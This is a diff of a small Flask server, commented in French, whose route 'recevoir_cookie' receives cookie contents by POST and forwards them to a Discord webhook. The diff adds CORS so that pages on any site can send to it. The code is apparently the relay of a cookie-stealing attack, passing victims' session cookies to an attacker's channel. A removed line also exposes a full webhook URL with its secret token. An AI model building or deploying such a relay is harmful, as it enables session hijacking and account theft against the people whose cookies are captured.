@@ -1,23 +1,23 @@
 from flask import Flask, request
-import requests  # pour envoyer des requêtes HTTP
+from flask_cors import CORS
+import requests
 import os
 
 app = Flask(__name__)
+CORS(app)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1399751822515765360/yMPVxF07xUsKKtaeXDMnmO2mcjQm0DBYqhv8fN3Z7eR75ydo39qKyzDTrIQoFo3yGDXu"
+WEBHOOK_URL = "https://discord.com/api/webhooks/..."
 
 @app.route("/", methods=["POST"])
 def recevoir_cookie():
     data = request.get_json()
+    print("🔍 Données reçues:", data)
     if not data or 'content' not in data:
         return "Bad request", 400
 
     cookie_content = data['content']
+    discord_data = { "content": cookie_content }
 
-    # Envoie le cookie au webhook Discord
-    discord_data = {
-        "content": cookie_content
-    }
     response = requests.post(WEBHOOK_URL, json=discord_data)
 
     if response.status_code == 204:
